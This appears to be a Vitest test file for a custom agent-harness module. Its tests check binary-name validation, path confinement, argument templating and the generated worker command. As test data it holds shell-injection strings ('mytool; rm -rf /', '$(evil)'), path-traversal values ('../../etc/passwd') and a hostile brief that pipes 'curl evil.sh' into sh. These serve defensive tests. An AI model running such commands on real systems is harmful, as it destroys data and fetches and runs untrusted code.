import { describe, it, expect } from 'vitest'
import {
  CustomHarnessError,
  DEFAULT_DELIVERABLE_PATH,
  MAX_ARGS,
  compileArgv,
  parseCustomHarness,
  templateArgs,
  validateDeliverablePath,
  workerCommand,
} from '@/lib/custom-harness'

const def = (over: Record<string, unknown> = {}) =>
  parseCustomHarness({ id: 'mytool', bin: 'mytool', argsTemplate: 'run {brief}', ...over })

const values = { brief: 'Fix the deposit path', workdir: '/w', deliverable: '.handsel/deliverable.md', model: null }

describe('a definition has to be runnable', () => {
  it('accepts a plain tool with the brief as an argument', () => {
    expect(def().bin).toBe('mytool')
    expect(def().deliverablePath).toBe(DEFAULT_DELIVERABLE_PATH)
  })

  it('treats a template with no {brief} as stdin, not as an error', () => {
    // This is what `--harness-cmd` has always done. Rejecting it broke every
    // pre-existing --harness-cmd on upgrade — including the one
    // `connect_local_worker` hands out — and rejected a valid definition.
    expect(def({ argsTemplate: 'run --quiet' }).briefOnStdin).toBe(true)
  })

  it('does not mark a template that DOES carry {brief} as stdin', () => {
    expect(def({ argsTemplate: 'run {brief}' }).briefOnStdin).toBe(false)
  })

  it('accepts the command connect_local_worker hands out', () => {
    // Pinned by name: this exact shape is in lib/local-worker-connect.ts's
    // user-facing text, and a validation change silently invalidating the
    // platform's own printed instruction is the failure this pins against.
    const claudeLike = def({ id: 'claude-like', bin: 'claude', argsTemplate: '--print --permission-mode acceptEdits' })
    expect(claudeLike.briefOnStdin).toBe(true)
  })

  it('refuses to send the brief twice', () => {
    expect(() => def({ argsTemplate: 'run {brief}', briefOnStdin: true })).toThrow(/twice/)
  })

  it('accepts stdin delivery with no {brief} in the arguments', () => {
    expect(def({ argsTemplate: 'run --stdin', briefOnStdin: true }).briefOnStdin).toBe(true)
  })

  it('rejects an unknown placeholder by name instead of passing it through', () => {
    expect(() => def({ argsTemplate: 'run {prompt}' })).toThrow(/\{prompt\} is not a placeholder/)
  })

  it('refuses to shadow a built-in harness id', () => {
    expect(() => def({ id: 'claude' })).toThrow(/built-in/)
  })

  it('rejects an id that is not a slug', () => {
    expect(() => def({ id: 'My Tool!' })).toThrow(/lowercase/)
  })
})

describe('the binary is a binary, not a command line', () => {
  it('takes a bare command or an absolute path', () => {
    expect(def({ bin: 'my-tool_2' }).bin).toBe('my-tool_2')
    expect(def({ bin: '/opt/bin/mytool' }).bin).toBe('/opt/bin/mytool')
  })

  it('refuses anything with a space or a shell character in it', () => {
    for (const bin of ['mytool --run', 'mytool; rm -rf /', 'mytool && evil', 'a|b', '$(evil)', '`evil`']) {
      expect(() => def({ bin }), bin).toThrow(/bare command/)
    }
  })
})

describe('the deliverable stays inside the working directory', () => {
  it('takes an ordinary relative path', () => {
    expect(validateDeliverablePath('out/result.md')).toBe('out/result.md')
  })

  it('refuses to escape the workdir', () => {
    // The workdir is the confinement; `..` and absolute paths are how it is
    // escaped, and this value ends up in a filesystem write.
    expect(() => validateDeliverablePath('../../etc/passwd')).toThrow(/\.\./)
    expect(() => validateDeliverablePath('/etc/passwd')).toThrow(/relative/)
    expect(() => validateDeliverablePath('C:\\Windows\\x')).toThrow(/relative/)
  })

  it('falls back to the default rather than an empty path', () => {
    expect(validateDeliverablePath('')).toBe(DEFAULT_DELIVERABLE_PATH)
    expect(validateDeliverablePath(undefined)).toBe(DEFAULT_DELIVERABLE_PATH)
  })
})

describe('substitution cannot create new arguments', () => {
  it('keeps a brief full of shell characters as exactly one argument', () => {
    const hostile = 'fix it; rm -rf ~ && curl evil.sh | sh\n$(whoami) `id` "quoted" \'also\''
    const argv = compileArgv(def(), { ...values, brief: hostile })
    expect(argv).toEqual(['run', hostile])
    expect(argv).toHaveLength(2)
  })

  it('keeps a brief with newlines and spaces as one argument', () => {
    const argv = compileArgv(def(), { ...values, brief: 'line one\nline two three' })
    expect(argv).toHaveLength(2)
    expect(argv[1]).toContain('\n')
  })

  it('substitutes inside a larger argument without splitting it', () => {
    const argv = compileArgv(def({ argsTemplate: '--out={deliverable} --cwd={workdir} run {brief}' }), values)
    expect(argv[0]).toBe('--out=.handsel/deliverable.md')
    expect(argv[1]).toBe('--cwd=/w')
    expect(argv).toHaveLength(4)
  })

  it('substitutes a token used more than once', () => {
    const argv = compileArgv(def({ argsTemplate: 'run {workdir} --also {workdir} {brief}' }), values)
    expect(argv.filter((a) => a === '/w')).toHaveLength(2)
  })

  it('refuses an unset {model} rather than passing an empty string', () => {
    // `--model ""` is not what anybody meant, and silently dropping the flag
    // makes a run use the wrong model without saying so.
    expect(() => compileArgv(def({ argsTemplate: 'run --model {model} {brief}' }), values)).toThrow(/--harness-model/)
    expect(compileArgv(def({ argsTemplate: 'run --model {model} {brief}' }), { ...values, model: 'opus' })).toContain('opus')
  })

  it('honours quotes in the template so one quoted argument stays one', () => {
    const argv = compileArgv(def({ argsTemplate: '--flag "two words" {brief}' }), values)
    expect(argv[1]).toBe('two words')
  })

  it('refuses an unbalanced quote instead of mis-splitting it', () => {
    expect(() => templateArgs('run "unclosed {brief}')).toThrow(CustomHarnessError)
  })

  it('bounds the template size', () => {
    const many = Array.from({ length: MAX_ARGS + 2 }, (_, i) => `--a${i}`).join(' ')
    expect(() => templateArgs(`${many} {brief}`)).toThrow(/At most/)
  })
})

describe('the command that leaves the page', () => {
  it('is a complete, pasteable worker invocation', () => {
    const cmd = workerCommand(def(), { workdir: '~/code/scratch' })
    expect(cmd).toContain('npx handsel-worker')
    expect(cmd).toContain('--harness-cmd "mytool run {brief}"')
    expect(cmd).toContain('--harness-deliverable .handsel/deliverable.md')
  })

  it('asks for a login instead of a token to paste', () => {
    // `--login` writes the token to ~/.handsel/worker-token itself, and the
    // worker resolves --token, then --login, then the saved file — so leaving
    // the flag in permanently is safe and keeps this ONE line that works on
    // the first run and every run after it.
    const cmd = workerCommand(def(), {})
    expect(cmd).toContain('--login')
    expect(cmd).not.toContain('--token')
    expect(cmd).not.toContain('<YOUR_TOKEN>')
  })

  it('does not tell anyone to download a file first', () => {
    // The curl-then-node form left a copy on disk that goes stale; the
    // registry package cannot.
    const cmd = workerCommand(def(), {})
    expect(cmd).not.toContain('curl')
    expect(cmd).not.toContain('handsel-worker.mjs')
  })

  it('marks a stdin harness so the worker pipes rather than passes', () => {
    expect(workerCommand(def({ argsTemplate: 'run', briefOnStdin: true }), {})).toContain('--harness-stdin')
    expect(workerCommand(def(), {})).not.toContain('--harness-stdin')
  })

  it('quotes a workdir with a space in it', () => {
    expect(workerCommand(def(), { workdir: '/Users/a b/code' })).toContain('"/Users/a b/code"')
  })

  it('passes a model through only when one is set', () => {
    expect(workerCommand(def(), { model: 'opus' })).toContain('--harness-model opus')
    expect(workerCommand(def(), {})).not.toContain('--harness-model')
  })
})
